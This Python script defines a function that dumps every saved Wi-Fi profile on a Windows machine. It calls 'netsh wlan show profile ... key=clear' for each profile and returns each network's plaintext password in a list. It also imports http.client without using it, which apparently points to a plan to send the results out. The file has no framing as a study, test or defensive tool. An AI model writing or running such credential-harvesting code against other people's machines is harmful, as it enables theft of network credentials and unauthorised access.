import re
import os
import http.client

def getwifipasswords():
    # 1. Get all wlan profiles
    command = "netsh wlan show profile"
    output1 = os.popen(command).read()

    # 2. Get all SSIDs
    split1 = re.split('    All User Profile     : ', output1)
    split1.pop(0)
    ssids = []
    for x in split1:
        ssids.append(x.strip())

    # 3. Use SSIDs to get password
    command = 'netsh wlan show profile "{}" key=clear'.format(ssids[0])
    output2 = os.popen(command).read()

    split2 = output2.split('    Key Content            : ',1)
    split2 = split2[1].split('\n',1)
    password = split2[0]
    # 4. Create for loop to get all passwords

    password = []
    for x in ssids:
        command = 'netsh wlan show profile "{}" key=clear'.format(x)
        output2 = os.popen(command).read()

        split2 = output2.split('    Key Content            : ',1)
        split2 = split2[1].split('\n',1)
        password.append(split2[0])

    # 5. Make dictionary for python
    # Turn it into a 2d list, e.g.: [[ssid1,pass1],[ssid2,pass2]]

    ssid_pass_full = []
    ssid_pass_json = []
    for x in range(len(ssids)):
        ssid_pass_full.append([ssids[x],password[x]])
        ssid_pass_json.append({'SSID':ssids[x],'password':password[x]})

    return(ssid_pass_json)